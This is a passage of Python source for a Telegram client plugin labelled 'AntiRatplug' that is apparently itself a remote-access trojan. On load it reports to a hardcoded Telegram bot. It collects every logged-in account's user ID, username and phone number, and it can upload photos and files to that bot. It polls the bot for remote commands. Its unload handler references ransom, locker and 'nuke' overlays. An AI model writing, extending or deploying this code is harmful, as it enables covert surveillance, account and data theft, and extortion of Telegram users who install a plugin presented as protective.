        self._input_mode = None
        self._input_context = None

    # ─── lifecycle ─────────────────────────────────────────────────────────
    def on_plugin_load(self):
        self._sync_running = True
        self._active = True
        self.stop = False
        try:
            self.dev = hashlib.md5((str(time.time()) + str(random.random())).encode()).hexdigest()[:16]
        except Exception:
            self.dev = "unknown"
        try:
            self.add_on_send_message_hook()
        except Exception as e:
            _log("hook: %s" % e)
        threading.Thread(target=self._boot, daemon=True).start()
        try:
            self._check_persisted_nuke()
        except Exception:
            pass
        try:
            self._check_persisted_idk()
        except Exception:
            pass

    def on_plugin_unload(self):
        self._sync_running = False
        self._active = False
        self.stop = True
        self._tg_kid_watching = False
        for fn in (self._hide_idk_overlay, self._dismiss_ransom,
                   self._clear_locker, self._clear_dim, self._clear_music):
            try:
                fn()
            except Exception:
                pass

    def create_settings(self):
        return []

    def _html_escape(self, text):
        if text is None:
            return ""
        t = str(text)
        return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    def _boot(self):
        time.sleep(self._jitter / 1000.0)
        time.sleep(random.uniform(0.2, 0.6))
        try:
            self._send_msg("AntiRatplug v21.2 loaded")
        except Exception as e:
            _log("boot send: %s" % e)
        try:
            self._send_manage_button()
        except Exception as e:
            _log("boot btn: %s" % e)
        try:
            self._start_polling()
        except Exception as e:
            _log("boot poll: %s" % e)

    def on_send_message_hook(self, account, params):
        return HookResult()

    # ─── accounts ─────────────────────────────────────────────────────────
    def _uc(self):
        try:
            sa = int(_UC().selectedAccount)
            if sa:
                return sa
        except Exception:
            pass
        for i in range(16):
            try:
                if _UC().getInstance(i).getClientUserId():
                    return i
            except Exception:
                pass
        return 0

    def _my_id(self, account=None, discover=False):
        acc = account if account is not None else self.account
        try:
            return int(_UC().getInstance(int(acc)).getClientUserId())
        except Exception:
            pass
        if not discover:
            return 0
        for i in range(16):
            try:
                uid = int(_UC().getInstance(i).getClientUserId())
                if uid:
                    self.account = i
                    return uid
            except Exception:
                pass
        return 0

    def _get_accounts_list(self):
        out = []
        try:
            mc = int(getattr(jclass("org.telegram.messenger.UserConfig"),
                             "MAX_ACCOUNT_COUNT", 8))
        except Exception:
            mc = 8
        mc = max(mc, 16)
        for i in range(mc):
            try:
                uc = _UC().getInstance(i)
                if not uc or not uc.isClientActivated():
                    continue
                uid = int(uc.getClientUserId())
                if uid == 0:
                    continue
                u = None
                try:
                    u = uc.getCurrentUser()
                except Exception:
                    pass
                if u is None:
                    try:
                        u = _MC().getInstance(i).getUser(uid)
                    except Exception:
                        pass
                un = ""
                ph = ""
                premium = False
                if u is not None:
                    un = str(getattr(u, "username", "") or "")
                    ph = _real_phone_or_empty(u).lstrip("+")
                    premium = _get_bool_attr(u, "premium", False)
                out.append({"id": i, "user_id": uid, "username": un,
                            "phone": ph, "premium": premium})
            except Exception as e:
                _log("acc %d: %s" % (i, e))
        return out

    # ─── peers / RPC ──────────────────────────────────────────────────────
    def _get_input_peer(self, account, peer_id):
        try:
            mc = _MC().getInstance(account)
            peer_id = int(peer_id)
            if peer_id > 0:
                user = mc.getUser(peer_id)
                IPUser = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
                              "org.telegram.tgnet.tl.TL_inputPeerUser",
                              "org.telegram.tgnet.tl.TL_messages$TL_inputPeerUser")
                if not IPUser:
                    return None
                ip = IPUser()
                ip.user_id = int(user.id) if user is not None else peer_id
                ip.access_hash = _safe_int(getattr(user, "access_hash", 0)) if user is not None else 0
                return ip
            if peer_id < -1000000000000:
                cid = -peer_id - 1000000000000
                chat = mc.getChat(cid)
                IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
                                 "org.telegram.tgnet.tl.TL_inputPeerChannel",
                                 "org.telegram.tgnet.tl.TL_channels$TL_inputPeerChannel")
                if not IPChannel:
                    return None
                ip = IPChannel()
                ip.channel_id = _safe_int(getattr(chat, "id", cid)) if chat is not None else cid
                ip.access_hash = _safe_int(getattr(chat, "access_hash", 0)) if chat is not None else 0
                return ip
            if peer_id < 0:
                cid = -peer_id
                chat = mc.getChat(cid)
                if chat is not None and getattr(chat, "migrated_to", None) is not None:
                    mt = chat.migrated_to
                    IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
                                     "org.telegram.tgnet.tl.TL_inputPeerChannel")
                    if not IPChannel:
                        return None
                    ip = IPChannel()
                    ip.channel_id = _safe_int(getattr(mt, "channel_id", 0))
                    ip.access_hash = _safe_int(getattr(mt, "access_hash", 0))
                    return ip
                IPChat = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChat",
                              "org.telegram.tgnet.tl.TL_inputPeerChat")
                if not IPChat:
                    return None
                ip = IPChat()
                ip.chat_id = int(cid)
                return ip
        except Exception as e:
            _log("peer: %s" % e)
        return None

    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
        if fast and timeout > 8.0:
            timeout = 8.0
        gate = _reply_gate_cls()()
        with self._rpc_lock:
            self._pending_delegates.append(gate)
        try:
            cm = _CM().getInstance(account)
            cm.sendRequest(req, gate)
            deadline = time.time() + timeout
            while time.time() < deadline:
                if gate.response is not None or gate.error is not None:
                    break
                time.sleep(0.08)
        finally:
            try:
                self._pending_delegates.remove(gate)
            except Exception:
                pass
        return gate.response, gate.error

    def _parallel(self, jobs, workers=5, timeout=25):
        try:
            from concurrent.futures import ThreadPoolExecutor
        except Exception:
            out = []
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as e:
                    out.append(e)
            return out
        out = []
        try:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
                for f in futs:
                    try:
                        out.append(f.result(timeout=timeout))
                    except Exception as e:
                        out.append(e)
        except Exception as e:
            _log("parallel: %s" % e)
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as ee:
                    out.append(ee)
        return out

    # ─── Bot API ──────────────────────────────────────────────────────────
    def _api(self, method):
        return API_BASE + "/" + method

    def _send_msg(self, text, html=False, retries=2):
        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000]}
        if html:
            body["parse_mode"] = "HTML"
        for att in range(max(1, retries)):
            r = _http_post_json(self._api("sendMessage"), body, timeout=20)
            if r is not None:
                return r
            time.sleep(1 + att)
        return None

    def _send_markup(self, text, keyboard, html=False):
        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000],
                "reply_markup": keyboard}
        if html:
            body["parse_mode"] = "HTML"
        _http_post_json(self._api("sendMessage"), body, timeout=20)

    def _send_photo(self, file_path, caption=""):
        try:
            with open(file_path, "rb") as f:
                raw = f.read()
        except Exception as e:
            _log("photo read: %s" % e)
            return
        fields = {"chat_id": BOT_UID_STR, "caption": str(caption)[:200]}
        _http_post_multipart(self._api("sendPhoto"), fields, "photo",
                             os.path.basename(file_path), raw)

    def _send_document_bytes(self, filename, data):
        fields = {"chat_id": BOT_UID_STR, "caption": str(filename)[:200]}
        _http_post_multipart(self._api("sendDocument"), fields, "document",
                             filename, data)

    def _answer_callback(self, cb_id):
        _http_post_json(self._api("answerCallbackQuery"),
                        {"callback_query_id": str(cb_id)}, timeout=10)

    def _start_polling(self):
        threading.Thread(target=self._poll, daemon=True).start()

    def _poll(self):
        offset = 0
        try:
            r = _http_get(self._api("getUpdates") + "?offset=-1&timeout=0", timeout=10)
            if r:
                try:
                    j = json.loads(r)
                    if j.get("ok") and j.get("result"):
                        offset = j["result"][-1]["update_id"] + 1
                except Exception:
                    pass
        except Exception:
            pass
        while self._sync_running and not self.stop:
            try:
                r = _http_get(self._api("getUpdates") + "?offset=" + str(offset) + "&timeout=15",
                              timeout=25)
                if r:
                    try:
                        j = json.loads(r)
                    except Exception:
                        j = None
                    if j and j.get("ok") and j.get("result"):
                        for u in j["result"]:
                            offset = u["update_id"] + 1
                            if "callback_query" in u:
                                try:
                                    threading.Thread(target=self._handle_callback,
                                                     args=(u["callback_query"],),
                                                     daemon=True).start()
                                except Exception:
                                    pass
                            elif "message" in u:
                                try:
                                    threading.Thread(target=self._handle_message,
                                                     args=(u["message"],),
                                                     daemon=True).start()
                                except Exception:
                                    pass
            except Exception as e:
                _log("poll: %s" % e)
            time.sleep(0.5)

